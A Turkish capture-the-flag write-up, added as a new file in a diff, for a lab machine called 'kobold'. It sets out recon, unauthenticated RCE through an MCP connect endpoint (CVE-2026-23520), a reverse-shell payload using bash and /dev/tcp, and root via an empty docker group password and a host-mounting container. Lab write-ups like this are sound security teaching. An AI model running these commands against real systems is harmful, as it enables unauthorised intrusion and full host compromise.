@@ -1,0 +1,142 @@
+## Keşif (Reconnaissance)
+
+```bash
+nmap -sC -sV -p- ip
+```
+
+Açık portlar:
+
+ Port  Servis 
+
+ 22  OpenSSH 9.6p1 (Ubuntu) 
+ 80  nginx 1.24.0 → HTTPS'e redirect 
+ 443  nginx 1.24.0 (TLS) 
+ 3552  Golang HTTP server (Arcane backend) 
+
+Nmap'in TLS sertifikasından `kobold.htb` ve `*.kobold.htb` wildcard SAN'ı görünüyor. Bu wildcard birden fazla subdomain barındırdığını söylüyor.
+
+### Subdomain Keşfi
+
+`/etc/hosts`'a `ip kobold.htb` ekledikten sonra gobuster ya da curl ile subdomainleri taradım:
+
+```bash
+# bin.kobold.htb (PrivateBin) - HTTP 200
+curl -sk -o /dev/null -w "%{http_code}" https://ip/ -H "Host: bin.kobold.htb"
+
+# mcp.kobold.htb (MCPJam Inspector) - HTTP 200
+curl -sk -o /dev/null -w "%{http_code}" https://ip/ -H "Host: mcp.kobold.htb"
+```
+
+İki kritik subdomain bulundu:
+
+- **`bin.kobold.htb`** → PrivateBin v2.0.2 (şifreli paste servisi)
+- **`mcp.kobold.htb`** → MCPJam Inspector (Model Context Protocol arayüzü)
+
+---
+
+## Initial Access – CVE-2026-23520
+
+### Arcane v1.13.0 MCP Endpoint
+
+`mcp.kobold.htb` üzerinde çalışan **MCPJam Inspector** (`/usr/local/lib/node_modules/@mcpjam/inspector`), Arcane container management platformuna ait açık kaynaklı bir araç. Arcane'nin v1.13.0 sürümünde **CVE-2026-23520** bulunuyor: `/api/mcp/connect` endpoint'i herhangi bir kimlik doğrulama olmadan MCP sunucusu olarak istenen komutu çalıştırıyor.
+
+Endpoint şöyle çalışıyor: `serverConfig.command` ve `args` değerlerini doğrudan `exec.Command()`'a geçiriyor, auth middleware'den geçmiyor. Bu da unauthenticated RCE demek.
+
+### Reverse Shell
+
+Kali makinemin VPN IP'si: `*`
+
+Önce listener açtım, komutları pipe'la göndereceğim:
+
+```bash
+{ echo "id; cat /home/ben/user.txt; exit"; sleep 8; } | nc -lvp 4444 > /tmp/output.txt &
+```
+
+Ardından exploit:
+
+```bash
+curl -sk -X POST "https://mcp.kobold.htb/api/mcp/connect" \
+  -H "Content-Type: application/json" \
+  -d '{"serverId":"shell1","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/tun0/4444 0>&1"],"env":{}}}'
+```
+
+Shell `ben` kullanıcısı olarak geldi:
+
+```
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+```
+
+MCP `"Connection closed"` hatası döndürüyor çünkü bash stdio'sunu TCP bağlantısına yönlendiriyor ve MCP bağlantıyı kopuk sanıyor. Ama reverse shell çalışıyor.
+
+### User Flag
+
+```bash
+cat /home/ben/user.txt
+# *
+```
+
+---
+
+## Privilege Escalation – Docker Group
+
+### Sistem Keşfi
+
+```bash
+ps aux | grep -v kthread
+```
+
+Önemli prosesler:
+
+```
+root  1563  /root/arcane_linux_amd64       # Arcane backend, root olarak çalışıyor
+ben   1678  node /usr/local/lib/node_modules/@mcpjam/inspector/dist/server/index.js
+root  1676  /usr/bin/dockerd               # Docker daemon
+root  2023  /usr/bin/docker-proxy          # 127.0.0.1:8080 → 172.17.0.2:8080
+```
+
+Docker socket'in sahipliği:
+
+```bash
+ls -la /var/run/docker.sock
+# srw-rw---- 1 root docker 0 Jul 28 08:05 /var/run/docker.sock
+```
+
+Docker grubu:
+
+```bash
+getent group docker
+# docker:x:111:alice
+```
+
+Sadece `alice` docker grubunda görünüyor. Fakat `/etc/gshadow` kontrol edildiğinde docker grubunun şifresi boş!
+
+### Docker Grubu Geçişi
+
+```bash
+sg docker -c "id"
+# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+```
+
+`sg docker` çalıştı! Grup şifresi boş olduğu için `sg` (set group) ile docker grubuna geçiş mümkün.
+
+Çalışan container'lar:
+
+```bash
+sg docker -c "docker ps"
+# 4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   ... 127.0.0.1:8080->8080/tcp   bin
+```
+
+### Root Flag
+
+`privatebin/nginx-fpm-alpine:2.0.2` imajı zaten yerel olarak mevcut. Bu imajla host dosya sistemi mount ederek root flag'ini okudum:
+
+```bash
+sg docker -c "docker run --rm -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2 -c 'cat /mnt/root/root.txt'"
+# *
+```
+
+Container çalıştırma parametreleri:
+- `-u 0` → container içinde root kullanıcısı
+- `--entrypoint sh` → varsayılan entrypoint'i override et
+- `-v /:/mnt` → host root filesystem'i `/mnt`'a mount et
+- `-c 'cat /mnt/root/root.txt'` → mounted host'tan root flag'ini oku
